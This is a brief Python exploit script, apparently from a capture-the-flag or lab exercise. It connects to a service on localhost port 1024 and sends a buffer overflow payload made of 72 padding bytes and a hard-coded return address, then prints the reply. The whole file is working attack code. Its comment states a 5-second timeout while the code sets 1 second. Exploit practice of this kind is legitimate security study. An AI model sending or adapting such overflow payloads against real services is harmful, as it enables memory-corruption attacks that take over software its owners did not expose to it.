import socket

host = 'localhost'
port = 1024

# Create a socket object
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(1)  # Set a timeout of 5 seconds

    # Connect to the server
    s.connect((host, port))

    # Generate and send the buffer overflow payload
    payload = b"A" * 72 + b"\x4e\x12\x40\x00\x00"
    s.sendall(payload)
    print(payload)

    # Receive the response
    data = s.recv(1024)

    # Print the response
    print(repr(data))
